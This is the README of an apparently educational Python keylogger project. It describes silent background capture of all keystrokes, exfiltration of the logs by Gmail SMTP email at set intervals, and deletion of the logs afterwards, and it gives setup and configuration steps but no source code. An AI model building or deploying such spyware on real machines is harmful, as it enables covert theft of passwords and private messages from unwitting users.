# 🖥️ Keylogger – Educational Python Project






  A simple yet powerful keylogger written in Python 🐍 for educational purposes. This tool demonstrates concepts in cybersecurity and Python programming by capturing keystrokes, logging 
  them to a file, and periodically emailing the logs to a specified address. The script runs silently in the background using threading.

# ✨ Features

  ⌨️ Keystroke Logging – Captures all keyboard events with timestamps 📅.

  🧵 Background Operation – Uses Python's threading for seamless background execution.

  📧 Automated Email Reports – Sends captured logs securely via Gmail’s SMTP.

  🗑️ Log Management – Deletes logs after sending to keep things clean and secure.

# ⚙️ How It Works

   Listener – Uses keyboard library to capture key presses.

   Logging – Saves keystrokes with timestamps in C:\Users\Public\logfile.txt.

   Scheduler – Runs in a background thread ⏱️.

   Emailing – Sends log files as email attachments at defined intervals.

   Cleanup – Deletes log file after successful email transmission.

   Persistence – Keeps running silently until manually stopped.

# 🚀 Getting Started

  📋 Prerequisites

  Python 3.x

  pip (Python package manager)

# 🛠️ Installation
```
# Clone the repository
   git clone https://github.com/lakshya-004/Keylogger.git  

# Navigate into the project folder
   cd Keylogger  

# Install dependencies
   pip install keyboard
```

# 📝 Configuration

   Before running the script, update your email settings inside Main.py:
```
send_email_with_attachment(
   sender_email="your_email@gmail.com",
   app_password="your_gmail_app_password",
   recipient_email="recipient_email@example.com",
   subject="Keylogger Log File",
   body="Attached is the keylogger log file.",
   file_path=log_file_path
)
```

  🔹 Use a Google App Password instead of your Gmail password (required for 2FA accounts).
  🔹 Change time.sleep(60) inside schedule_email() to adjust the email interval (in seconds).

# ▶️ Running the Script
```
python Main.py

```
  The script runs in the background silently. To stop it:

  Press Ctrl + C in the terminal, or

  End the process via Task Manager.

# ⚠️ Disclaimer

  This project is for educational purposes only 🏫.
  Misuse of this tool on systems without explicit permission is illegal and unethical.
  The author is not responsible for any misuse or consequences.
  Use responsibly and within the boundaries of the law ⚖️.
